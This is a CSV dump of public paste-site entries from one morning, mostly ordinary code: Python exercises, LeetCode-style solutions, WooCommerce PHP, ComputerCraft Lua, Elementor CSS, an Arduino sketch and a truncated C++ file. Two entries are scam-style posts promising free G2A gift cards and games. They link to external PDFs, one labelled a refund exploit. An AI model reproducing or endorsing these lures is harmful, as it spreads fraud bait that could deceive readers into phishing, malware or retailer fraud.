id,title,username,language,date,content
n8B6viZt,Практика (день 6),Lavig,Python,Monday 20th of May 2024 06:53:26 AM CDT,"def skip():
    print (""_"" * 60)
    print (""_"" * 60)
skip()
# Варіант 2
# Завдання 1
while True:
    even = []
    odd = []
    array = input(""\033[1m\033[33mВведіть через пробіл цілі числа, які бажаєте відсортувати: \033[0m"")
    array = array.split()
    try:
        array = list(map(float, array))
    except:
        print(""\033[1m\033[31mВведений масив має складатися тільки з цілих чисел. Спробуйте ввести інший масив!\033[0m"")
        continue
    is_error = 0
    for i in range(len(array)):
        if array[i].is_integer():
            if array[i] % 2 == 0:
                even.append(int(array[i]))
            else:
                odd.append(int(array[i]))
            array[i] = int(array[i])
            continue
        else:
            is_error = 1
        break
    if is_error == 1:
        print(""\033[1m\033[31mВведений масив має складатися тільки з цілих чисел. Спробуйте ввести інший масив!\033[0m"")
        continue
    else:
        break
if len(even) == 0:
    print(""\033[1m\033[95mПарних чисел у масиві немає\033[0m"")
else:
    print(""\033[1m\033[95mПарні числа:"", ""\033[97m"", end='')
    print(*even, sep=', ', end = ""\033[0m\n"")
if len(odd) == 0:
    print(""\033[92;1mНепарних чисел у масиві немає\033[0m"")
else:
    print(""\033[92;1mНепарні числа:"", ""\033[97m"",  end = '')
    print(*odd, sep=', ', end = ""\033[0m\n"")
skip()
#Завдання 2
while True:
    try:
        first_number = (input(""\033[1m\033[96mВведіть перше число: \033[0m""))
        second_number = (input(""\033[1m\033[33mВведіть друге число: \033[0m""))
        third_number = (input(""\033[1m\033[95mВведіть третє число: \033[0m""))
        float(first_number)
        float(second_number)
        float(third_number)
        break
    except:
        print(""\033[1m\033[31mВводити можна тільки числа. Спробуйте ще раз!\033[0m"")
        continue
first_number = float(first_number)
second_number = float(second_number)
third_number = float(third_number)
if first_number.is_integer() == True:
    first_number = int(first_number)
if second_number.is_integer() == True:
    second_number = int(second_number)
if third_number.is_integer() == True:
    third_number = int(third_number)
m = max(first_number, second_number, third_number)
print(""\033[92;1mНайбільше число –\033[97m"", m, ""\033[0m"")
skip()"
SXBTkLn8,Untitled,phatboislym,Python,Monday 20th of May 2024 06:52:57 AM CDT,"def subsetXORSum(nums: list[int]) -> int:
    size = len(nums)

    def DFS(i: int, xor: int) -> int:
        if i == size:
            return xor

        return DFS(i + 1, xor ^ nums[i]) + DFS(i + 1, xor)

    return DFS(0, 0)"
ENUWQX3s,Untitled,phatboislym,Python,Monday 20th of May 2024 06:41:01 AM CDT,"def subsetXORSum(nums: list[int]) -> int:
    size = len(nums)
    xor = 0

    for i in range(1, 2 ** size):
        subset_map = format(i, f""0{size}b"")
        subset_xor = 0
        for index in range(size):
            if subset_map[index] == '1':
                subset_xor ^= nums[index]
        xor += subset_xor

    return xor
"
w8iqPuKe,🤑 G2A.com Free Gift Card Guide May 2024 FIX 🤑,jusst2k4,GetText,Monday 20th of May 2024 06:21:13 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_520621.pdf

Working as of:
20 May 2024"
CDiYnwkv,mine,S3mpx,Lua,Monday 20th of May 2024 06:08:15 AM CDT,"-- Define the ores to search for
local targetOres = {
    [""minecraft:iron_ore""] = true,
    [""minecraft:lead_ore""] = true,
    [""minecraft:nickel_ore""] = true
}

-- Function to detect the block in front of the turtle
local function detectBlock()
    local success, data = turtle.inspect()
    if success and targetOres[data.name] then
        return true
    end
    return false
end

-- Function to detect the block above the turtle
local function detectBlockUp()
    local success, data = turtle.inspectUp()
    if success and targetOres[data.name] then
        return true
    end
    return false
end

-- Function to detect the block below the turtle
local function detectBlockDown()
    local success, data = turtle.inspectDown()
    if success and targetOres[data.name] then
        return true
    end
    return false
end

-- Function to mine in front of the turtle
local function mineForward()
    while turtle.detect() do
        turtle.dig()
    end
    turtle.forward()
end

-- Function to mine up
local function mineUp()
    while turtle.detectUp() do
        turtle.digUp()
    end
    turtle.up()
end

-- Function to mine down
local function mineDown()
    while turtle.detectDown() do
        turtle.digDown()
    end
    turtle.down()
end

-- Function to mine around the turtle (front, left, right, up, down)
local function mineAround()
    -- Check front
    if detectBlock() then
        mineForward()
        mineAround()
        turtle.back()
    end
    
    -- Check left
    turtle.turnLeft()
    if detectBlock() then
        mineForward()
        mineAround()
        turtle.back()
    end
    turtle.turnRight()

    -- Check right
    turtle.turnRight()
    if detectBlock() then
        mineForward()
        mineAround()
        turtle.back()
    end
    turtle.turnLeft()

    -- Check up
    if detectBlockUp() then
        mineUp()
        mineAround()
        turtle.down()
    end

    -- Check down
    if detectBlockDown() then
        mineDown()
        mineAround()
        turtle.up()
    end
end

-- Main mining function
local function mineTunnel(length)
    for i = 1, length do
        mineForward()
        mineAround()
    end
end

-- Main program
print(""Starting mining program..."")
local tunnelLength = 20  -- Adjust as needed
mineTunnel(tunnelLength)
print(""Mining program completed."")"
vVFBNT6e,🤑 G2A.com Free Gift Card Guide May 2024 FIX 🎁,ssss50w,GetText,Monday 20th of May 2024 06:07:44 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view?usp=sharing
 
Working as of:
20 May 2024"
qA2R2t3Z,data932,TestGuy1,JSON,Monday 20th of May 2024 06:00:07 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'a52990ce56b4e7ca4d768c3dbb1691d5fae2f26054c7a6c8e79d7a0c06e18441c8c3e32664b673133286e090347929f61ef445d00455a153125ac15969bfbb07701b4d044d3f1b874b66cddd7599e71f7d5a19ccb01b3a69dbf05f2ee1234a918eb4330c124a536db82e1398d15c25257562ac72f36cf2d7195ea674002b98a4',
  otherdata: [
    '0e4e619b49e7384e0a2dd221fa0b3062',
    '1ab295fdd5c1a6e839d31f84e3f675fe',
    'b52d44fee3667c662cfc8d392dd6ab69',
    'f64caa247189c5077ede7ba25eec2114',
    '5a62e6e89a180c8de173d35cf10a77f0',
    'b19579d9055877f764c99e59be492e86',
    'df854ea86aa9cbf21579dfbcd9a86b77',
    '65eb6ad8cdd36e374bfe733d8f05de46'
  ]
}"
0ZbJ7GnG,WP GlobalCart - klarna-checkout-for-woocommerce,nshelper,PHP,Monday 20th of May 2024 04:50:45 AM CDT,"	public function process_cart() {
		foreach ( WC()->cart->get_cart() as $cart_item ) {
            do_action( 'woocommerce/cart_loop/start', $cart_item );
			if ( $cart_item['quantity'] ) {
				if ( $cart_item['variation_id'] ) {
					$product = wc_get_product( $cart_item['variation_id'] );
				} else {
					$product = wc_get_product( $cart_item['product_id'] );
				}
				$this->total_amount        = self::format_number( $cart_item['line_total'] );
				$this->subtotal_amount     = self::format_number( $cart_item['line_subtotal'] );
				$this->total_tax_amount    = self::format_number( array_sum( $cart_item['line_tax_data']['total'] ) );
				$this->subtotal_tax_amount = self::format_number( array_sum( $cart_item['line_tax_data']['subtotal'] ) );
				$this->quantity            = $cart_item['quantity'];

				$klarna_item = array(
					'reference'             => $this->get_item_reference( $product ),
					'name'                  => $this->get_item_name( $cart_item ),
					'quantity'              => $this->get_item_quantity( $cart_item ),
					'unit_price'            => $this->get_item_price( $cart_item ),
					'tax_rate'              => $this->get_item_tax_rate( $cart_item, $product ),
					'total_amount'          => $this->get_item_total_amount( $cart_item, $product ),
					'total_tax_amount'      => $this->get_item_tax_amount( $cart_item, $product ),
					'total_discount_amount' => $this->get_item_discount_amount( $cart_item, $product ),
				);

				if ( class_exists( 'WC_Subscriptions_Product' ) && WC_Subscriptions_Product::is_subscription( $product ) ) {
					$klarna_item['subscription'] = array(
						'name'           => $klarna_item['name'],
						'interval'       => strtoupper( WC_Subscriptions_Product::get_period( $product ) ),
						'interval_count' => absint( WC_Subscriptions_Product::get_interval( $product ) ),
					);
				}

				// Product type.
				if ( $product->is_downloadable() || $product->is_virtual() ) {
					$klarna_item['type'] = 'digital';
				} else {
					$klarna_item['type'] = 'physical';
				}

				// Add images.
				$klarna_checkout_settings = get_option( 'woocommerce_kco_settings', array() );
				if ( isset( $klarna_checkout_settings ) && 'yes' === $klarna_checkout_settings['send_product_urls'] ) {
					$klarna_item['product_url'] = $this->get_item_product_url( $product );
					if ( $this->get_item_image_url( $product ) ) {
						$klarna_item['image_url'] = $this->get_item_image_url( $product );
					}
				}

				/* This should better support get_catalog_visibility = hidden on product components.  */
				$cart_line_item = apply_filters( 'kco_wc_cart_line_item', $klarna_item, $cart_item );
				if ( $cart_line_item ) {
					$this->order_lines[] = $cart_line_item;
				}
			}
            do_action( 'woocommerce/cart_loop/end', $item );
		}
	}"
tLNmic9W,Untitled,Ahmed_Negm,C++,Monday 20th of May 2024 04:39:24 AM CDT,"#include<bits/stdc++.h>
using namespace std;

#define ll long long
#define nl ""\n""

void files(){
    ios_base::sync_with_stdio(false),cin.tie(NULL),cout.tie(NULL);
    #ifndef ONLINE_JUDGE
        freopen(""input.txt"", ""r"", stdin), freopen(""output.txt"", ""w"", stdout); 
    #endif
}

struct Hash{
    const static int mod = 1e9 + 7,p1 = 31,p2 = 37;
    int n;
    vector<int> h1,h2,pw1,pw2;
    Hash(string &s){
        n = s.size();
        h1 = vector<int>(n + 1,0),h2 = vector<int>(n + 1,0);
        pw1 = vector<int>(n + 1,1),pw2 = vector<int>(n + 1,1);
        for(int i = 1; i <= n; i++){
            h1[i] = (1LL * h1[i - 1] * p1 + s[i - 1]) % mod;
            h2[i] = (1LL * h2[i - 1] * p2 + s[i - 1]) % mod;
            pw1[i] = 1LL * pw1[i - 1] * p1 % mod;
            pw2[i] = 1LL * pw2[i - 1] * p2 % mod;
        }
    }

    pair<int,int> get(int l,int r){
        int a = (h1[r] - 1LL * h1[l - 1] * pw1[r - l + 1] % mod + mod) % mod;
        int b = (h2[r] - 1LL * h2[l - 1] * pw2[r - l + 1] % mod + mod) % mod;
        return {a,b};
    }
};


void solve(){
    int n; cin>>n;
    string s; cin>>s;
    string t = s;
    reverse(t.begin(),t.end());
    Hash h1(s),h2(t);

    int ans = 0;
    int res = 1;
    int l = 0, r = n;
    while(l<=r){
        int m = (l + r) / 2;
        bool ok = false;
        for(int i = m+1; i+m <= n and i-m>=1; i++){
            int left = i-m,right = i+m;
            auto a = h1.get(left,right);
            auto b = h2.get(n-right+1,n-left+1);
            if(a == b){
                ok = true;
                break;
            }
        }
        if(ok){
            ans = m;
            res = max(res,2*ans+1);
            l = m + 1;
        }else r = m - 1;
    }


    l = 0, r = n, ans = 0;
    while(l<=r){
        int m = (l + r) / 2;
        bool ok = false;
        for(int i = m+1; i+m < n and i-m>=1; i++){
            int left = i-m,right = i+m+1;
            // cout<<left<<"" ""<<right<<' '<<m<<nl;
            auto a = h1.get(left,right);
            auto b = h2.get(n-right+1,n-left+1);
            if(a == b){
                ok = true;
                break;
            }
        }
        if(ok){
            ans = m;
            res = max(res,2*ans+2);
            l = m + 1;
        }else r = m - 1;
    }


    cout<<res<<nl;

}

int main(){
    files();
    int t = 1; 
    // cin>>t;
    while(t--) solve();

    return 0;
}"
TWTsFvGH,move,S3mpx,Lua,Monday 20th of May 2024 04:38:47 AM CDT,"-- Turtle Programm --
-- Category: Movement/Mining --

-- [INFORMATION] --
local appName = ""Move.lua""
local appType = ""Turtle""
local category = ""Movement/Mining""
local version = ""1.0""
local author = ""S3mpx""
-- print info --
print(""[""..appName..""]"")
print(""Programm Type: ""..appType)
print(""Category: ""..category)
print(""Version: ""..version)
print(""written by""..author)

-- [LOCALS] --

local x = """"
local y = """"

-- [FUNKTIONS] --

-- go(x) --
local function go(x)
	for i=1, x do
		turtle.dig()
		turtle.forward()
	end
end

-- up(x) --
local function up(x)
	for i=1, x do
		turtle.digUp()
		turtle.up()
	end
end

-- down(x) --
local function down(x)
	for i=1, x do
		turtle.digDown()
		turtle.down()
	end
end

-- left(x) --
local function left(x)
	turtle.turnLeft()
	go(x)
end

-- right(x) --
local function right(x)
	turtle.turnRight()
	go(x)
end

-- cobble(x) --
local function cobble(x)
	for i=1, x do
		if turtle.detect() then
			turtle.dig()
		else
			i = i-1
		end
	end
end

-- emptyInventory --
local function emptyInventory()
    right(0)
    right(0)
    for slot = 1, 16 do
        turtle.select(slot)
        while turtle.getItemCount(slot) > 0 do
            if not turtle.drop() then
                print(""Chest is full or no chest behind. Exiting..."")
                return false
            end
        end
    end
    right(0)
    right(0)
    return true
end

-- [MAIN FUNKTION] --

print(""When you're done, type 'done'!"")

while true do
	y = io.read()
	if y == ""empty"" then
		print(""emptying inventory..."")
		emptyInventory()
		print(""success!"")
	end
	if y == ""cobble"" then
		print(""how many blocks? (x)"")
		x = io.read()
		cobble(x)
	end
	if y == ""go"" then
		print(""go(x)?"")
		x = io.read()
		go(x)
	end
	if y == ""up"" then
		print(""up(x)?"")
		x = io.read()
		up(x)
	end
	if y == ""down"" then
		print(""down(x)?"")
		x = io.read()
		down(x)
	end
	if y == ""left"" then
		print(""left(x)?"")
		x = io.read()
		left(x)
	end
	if y == ""right"" then
		print(""right(x)?"")
		x = io.read()
		right(x)
	end
end

-- [END] --"
dAYwN8N9,Untitled,s-sols,CSS,Monday 20th of May 2024 04:31:09 AM CDT,"/* Home */

body:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) #site-header-wrap .inject-space {
    height: 0 !important;
}

body article.page-content>.elementor>section.elementor-section:first-of-type {
    z-index: 1 !important;
}

/* About */

body.elementor-page-1133:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) section:nth-of-type(3) .elementor-column-gap-extended .elementor-widget-mae-gallery-carousel .master-carousel-box>.item-carousel:nth-of-type(1n + 2) {
    display: none;
}

body.elementor-page-1133:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) section:nth-of-type(3) .elementor-column-gap-extended .elementor-widget-mae-gallery-carousel .elementor-widget-container:has(.master-carousel-box>.item-carousel) {
    height: auto !important;
    aspect-ratio: 4 / 3;
}

@media screen and (max-width: 767px) {
    body.elementor-page-1133:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) section:nth-of-type(3) .elementor-column-gap-extended .elementor-col-50:last-of-type:not(:has(.flickity-viewport)) {
        margin-bottom: 60px;
    }
}

/* PROJECTS */

/* automotive-industry */
@media screen and (min-width: 768px) {

    body.elementor-page-3436:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) section:nth-of-type(1n + 2) .master-carousel-box .master-gallery.item-carousel:nth-of-type(1n + 3) {
        display: none !important;
    }

    body.elementor-page-3436:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) section:nth-of-type(2) .master-carousel-box .master-gallery.item-carousel {
        width: calc((100% - 30px) / 2);
        float: left;
        margin-right: 30px !important;
    }

    body.elementor-page-3436:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) section:nth-of-type(2) .master-carousel-box .master-gallery.item-carousel:nth-of-type(2) {
        margin-right: 0px !important;
    }

    body.elementor-page-3436.seraph-accel-view-cmn section:nth-of-type(2) .master-carousel-box .flickity-viewport .master-gallery.item-carousel:nth-of-type(2) {
        margin-right: 30px !important;
    }


    body.elementor-page-3436:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) section:nth-of-type(3) .master-carousel-box .master-gallery.item-carousel {
        width: calc((100% - 20px) / 2);
        float: left;
        margin-right: 20px !important;
    }

    body.elementor-page-3436:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) section:nth-of-type(3) .master-carousel-box .master-gallery.item-carousel:nth-of-type(2) {
        margin-right: 0px !important;
    }

    body.elementor-page-3436 section:nth-of-type(3) .master-carousel-box .flickity-viewport .master-gallery.item-carousel:nth-of-type(2) {
        margin-right: 20px !important;
    }

    body.elementor-page-3436:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) section:nth-of-type(5) .master-carousel-box .master-gallery.item-carousel {
        width: calc((100% - 20px) / 2);
        float: left;
        margin-right: 20px !important;
    }

    body.elementor-page-3436:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) section:nth-of-type(5) .master-carousel-box .master-gallery.item-carousel:nth-of-type(2) {
        margin-right: 0px !important;
    }

    body.elementor-page-3436 section:nth-of-type(5) .master-carousel-box .flickity-viewport .master-gallery.item-carousel:nth-of-type(2) {
        margin-right: 20px !important;
    }
}

@media screen and (max-width: 767px) {
    body.elementor-page-3436:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) section:nth-of-type(1n + 2) .master-carousel-box .master-gallery.item-carousel:nth-of-type(1n + 2) {
        display: none !important;
    }

    body.elementor-page-3436 section:nth-of-type(3):not(:has(.flickity-viewport)) .master-carousel-box .master-gallery.item-carousel {
        margin-bottom: 60px;
    }

    body.elementor-page-3436 section:nth-of-type(5):not(:has(.flickity-viewport)) .master-carousel-box .master-gallery.item-carousel {
        margin-bottom: 60px;
    }
}


/* medical-industry */

body.elementor-page-3415 {
    --content-width: 1170px;
}

body.elementor-page-3415:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) :is(section:nth-of-type(2), section:nth-of-type(4), section:nth-of-type(6)) .elementor-widget-container:has(.master-carousel-box) {
    overflow: hidden;
}

body.elementor-page-3415:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) :is(section:nth-of-type(2), section:nth-of-type(6)) .master-carousel-box {
    width: 700% !important;
    height: calc((var(--content-width) - 40px) / 2);
}

body.elementor-page-3415:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) section:nth-of-type(4) .master-carousel-box {
    width: 1000% !important;
    height: calc((var(--content-width) - 40px) / 2 / 1.47);
}

body.elementor-page-3415:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) :is(section:nth-of-type(2), section:nth-of-type(4), section:nth-of-type(6)) .master-carousel-box .master-gallery.item-carousel {
    width: calc((var(--content-width) - 40px) / 2);
    float: left;
    margin-right: 20px !important;
}

@media screen and (max-width: 1299px) {
    body.elementor-page-3415 {
        --content-width: 90vw;
    }
}

@media screen and (max-width: 767px) {
    body.elementor-page-3415:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) :is(section:nth-of-type(2), section:nth-of-type(4)) .master-carousel-box {
        margin-bottom: 60px;
    }

    body.elementor-page-3415:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) :is(section:nth-of-type(2), section:nth-of-type(6)) .master-carousel-box {
        width: 2000% !important;
        height: calc((var(--content-width) - 20px));
    }

    body.elementor-page-3415:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) section:nth-of-type(4) .master-carousel-box {
        width: 1000% !important;
        height: calc((var(--content-width) - 20px) / 1.47);
    }

    body.elementor-page-3415:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) :is(section:nth-of-type(2), section:nth-of-type(4), section:nth-of-type(6)) .master-carousel-box .master-gallery.item-carousel {
        width: calc((var(--content-width) - 20px));
        float: left;
        margin-right: 0px !important;
    }
}


/* aeronautics */

body.elementor-page-3569 {
    --content-width: 1170px;
    --ratio-sec-2: 1.77;
    --ratio-sec-4: 1.06;
    --ratio-sec-6: 1.3;
}

body.elementor-page-3569:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) :is(section:nth-of-type(2), section:nth-of-type(4), section:nth-of-type(6)) .elementor-widget-container:has(.master-carousel-box) {
    overflow: hidden;
}

body.elementor-page-3569:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) :is(section:nth-of-type(2), section:nth-of-type(4), section:nth-of-type(6)) .master-carousel-box {
    width: 1000% !important;
    height: calc((var(--content-width) - 40px) / 2 / var(--img-ratio));
}

body.elementor-page-3569:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) section:nth-of-type(2) .master-carousel-box {
    --img-ratio: var(--ratio-sec-2);
}

body.elementor-page-3569:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) section:nth-of-type(4) .master-carousel-box {
    --img-ratio: var(--ratio-sec-4);
}

body.elementor-page-3569:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) section:nth-of-type(6) .master-carousel-box {
    --img-ratio: var(--ratio-sec-6);
}


body.elementor-page-3569:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) :is(section:nth-of-type(2), section:nth-of-type(4), section:nth-of-type(6)) .master-carousel-box .master-gallery.item-carousel {
    width: calc((var(--content-width) - 40px) / 2);
    float: left;
    margin-right: 20px !important;
}

@media screen and (max-width: 1299px) {
    body.elementor-page-3569 {
        --content-width: 90vw;
    }
}

@media screen and (max-width: 767px) {
    body.elementor-page-3569:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) :is(section:nth-of-type(2), section:nth-of-type(4)) .master-carousel-box {
        margin-bottom: 60px;
    }

    body.elementor-page-3569:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) :is(section:nth-of-type(2), section:nth-of-type(4), section:nth-of-type(6)) .master-carousel-box {
        width: 2000% !important;
        height: calc((var(--content-width) - 20px) / var(--img-ratio));
    }

    body.elementor-page-3569:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) :is(section:nth-of-type(2), section:nth-of-type(4), section:nth-of-type(6)) .master-carousel-box .master-gallery.item-carousel {
        width: calc((var(--content-width) - 20px));
        float: left;
        margin-right: 0px !important;
    }
}


/* heavy-industry */

body.elementor-page-3523 {
    --content-width: 1170px;
    --ratio-sec-2: 1.33;
    --ratio-sec-4: 1.33;
}

body.elementor-page-3523:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) :is(section:nth-of-type(2), section:nth-of-type(4)) .elementor-widget-container:has(.master-carousel-box) {
    overflow: hidden;
}

body.elementor-page-3523:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) :is(section:nth-of-type(2), section:nth-of-type(4)) .master-carousel-box {
    width: 1000% !important;
    height: calc((var(--content-width) - 40px) / 2 / var(--img-ratio));
}

body.elementor-page-3523:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) section:nth-of-type(2) .master-carousel-box {
    --img-ratio: var(--ratio-sec-2);
}

body.elementor-page-3523:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) section:nth-of-type(4) .master-carousel-box {
    --img-ratio: var(--ratio-sec-4);
}

body.elementor-page-3523:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) :is(section:nth-of-type(2), section:nth-of-type(4)) .master-carousel-box .master-gallery.item-carousel {
    width: calc((var(--content-width) - 40px) / 2);
    float: left;
    margin-right: 20px !important;
}

@media screen and (max-width: 1299px) {
    body.elementor-page-3523 {
        --content-width: 90vw;
    }
}

@media screen and (max-width: 767px) {
    body.elementor-page-3523:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) :is(section:nth-of-type(2), section:nth-of-type(4)) .master-carousel-box {
        margin-bottom: 60px;
    }

    body.elementor-page-3523:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) :is(section:nth-of-type(2), section:nth-of-type(4)) .master-carousel-box {
        width: 2000% !important;
        height: calc((var(--content-width) - 20px) / var(--img-ratio));
    }

    body.elementor-page-3523:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) :is(section:nth-of-type(2), section:nth-of-type(4)) .master-carousel-box .master-gallery.item-carousel {
        width: calc((var(--content-width) - 20px));
        float: left;
        margin-right: 0px !important;
    }
}


/* research */

body.elementor-page-6081 {
    --content-width: 1170px;
    --ratio-sec-2: 1.33;
}

body.elementor-page-6081:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) section:nth-of-type(2) .elementor-widget-container:has(.master-carousel-box) {
    overflow: hidden;
}

body.elementor-page-6081:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) section:nth-of-type(2) .master-carousel-box {
    width: 1000% !important;
    height: calc((var(--content-width) - 40px) / 2 / var(--img-ratio));
}

body.elementor-page-6081:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) section:nth-of-type(2) .master-carousel-box {
    --img-ratio: var(--ratio-sec-2);
}



body.elementor-page-6081:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) section:nth-of-type(2) .master-carousel-box .master-gallery.item-carousel {
    width: calc((var(--content-width) - 40px) / 2);
    float: left;
    margin-right: 20px !important;
}

@media screen and (max-width: 1299px) {
    body.elementor-page-6081 {
        --content-width: 90vw;
    }
}

@media screen and (max-width: 767px) {
    body.elementor-page-6081:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) section:nth-of-type(2) .master-carousel-box {
        margin-bottom: 60px;
    }

    body.elementor-page-6081:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) section:nth-of-type(2) .master-carousel-box {
        width: 2000% !important;
        height: calc((var(--content-width) - 20px) / var(--img-ratio));
    }

    body.elementor-page-6081:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) section:nth-of-type(2) .master-carousel-box .master-gallery.item-carousel {
        width: calc((var(--content-width) - 20px));
        float: left;
        margin-right: 0px !important;
    }
}


/* SERVICES - mixed */

body:is(.elementor-page-3607, .elementor-page-3837, .elementor-page-4005) div[data-elementor-type=""wp-page""] .elementor-section:first-of-type .master-parallax-box>.parallax-wrap:not([style*=""height""])>.master-parallax-item:first-of-type {
    transform: translateY(39%) !important;
}

body.elementor-page-3698 div[data-elementor-type=""wp-page""] .elementor-section:first-of-type .master-parallax-box>.parallax-wrap:not([style*=""height""])>.master-parallax-item:first-of-type {
    transform: translateY(51%) !important;
}

body.elementor-page-3926 div[data-elementor-type=""wp-page""] .elementor-section:first-of-type .master-parallax-box>.parallax-wrap:not([style*=""height""])>.master-parallax-item:first-of-type {
    transform: translateY(53%) !important;
}

body.elementor-page-3698 section section+.elementor-element .elementor-spacer-inner {
    height: 100px;
}

@media screen and (max-width: 1024px) {
    body.elementor-page-3698 section section+.elementor-element .elementor-spacer-inner {
        height: 80px;
    }
}

@media screen and (max-width: 767px) {
    body.elementor-page-3698 section section+.elementor-element .elementor-spacer-inner {
        height: 60px;
    }
}

@media screen and (max-width: 1024px) {
    body:is(.elementor-page-3607, .elementor-page-3837, .elementor-page-4005, .elementor-page-3698, .elementor-page-3926) section:nth-of-type(1n + 2) .master-carousel-box:not(:has(.flickity-slider)) .master-gallery.item-carousel:nth-of-type(1n + 2) {
        display: none !important;
    }

    body:is(.elementor-page-3607, .elementor-page-3837, .elementor-page-4005, .elementor-page-3698, .elementor-page-3926) section section .elementor-col-50:last-of-type:not(:has(.parallax-wrap[style*=""height""])) {
        height: 90vw;
    }

}"
K4YDp237,Analog Communication rev_01,pleasedontcode,Arduino,Monday 20th of May 2024 04:21:38 AM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: Analog Communication
	- Source Code NOT compiled for: Arduino Uno
	- Source Code created on: 2024-05-20 09:21:25

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* I am using Arduino uno for a project   The project */
	/* idea is I'm going to send an audio signal through */
	/* the Arduino uno and take output through it.  The */
	/* function is whatever the signal audio signal is */
	/* given the output must me in the decibel which I */
	/* will */
/****** END SYSTEM REQUIREMENTS *****/

/****** DEFINITION OF LIBRARIES *****/

#include <Arduino.h>

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

/***** DEFINITION OF ANALOG INPUT PINS *****/
const uint8_t potentiometer_Potentiometer_Vout_PIN_A0 = A0;
const uint8_t potentiometer_Potentiometer_Vout_PIN_A1 = A1;

void setup(void)
{
	// put your setup code here, to run once:

	pinMode(potentiometer_Potentiometer_Vout_PIN_A0, INPUT);
	pinMode(potentiometer_Potentiometer_Vout_PIN_A1, INPUT);

	// Initialize serial communication
	Serial.begin(9600);
}

void loop(void)
{
	// put your main code here, to run repeatedly:

	// Read analog input values
	int sensorValue_A0 = analogRead(potentiometer_Potentiometer_Vout_PIN_A0);
	int sensorValue_A1 = analogRead(potentiometer_Potentiometer_Vout_PIN_A1);

	// Print the sensor values to the serial monitor
	Serial.print(""Sensor Value A0: "");
	Serial.println(sensorValue_A0);
	Serial.print(""Sensor Value A1: "");
	Serial.println(sensorValue_A1);

	// Delay for readability
	delay(1000);
}

/* END CODE */"
daY85SD7,Untitled,gurenko,C++,Monday 20th of May 2024 04:13:01 AM CDT,"#include <algorithm>
#include <cmath>
#include <iostream>
#include <map>
#include <numeric>
#include <set>
#include <string>
#include <utility>
#include <vector>

using namespace std;

const int MAX_RESULT_DOCUMENT_COUNT = 5;

string ReadLine() {
    string s;
    getline(cin, s);
    return s;
}

int ReadLineWithNumber() {
    int result;
    cin >> result;
    ReadLine();
    return result;
}

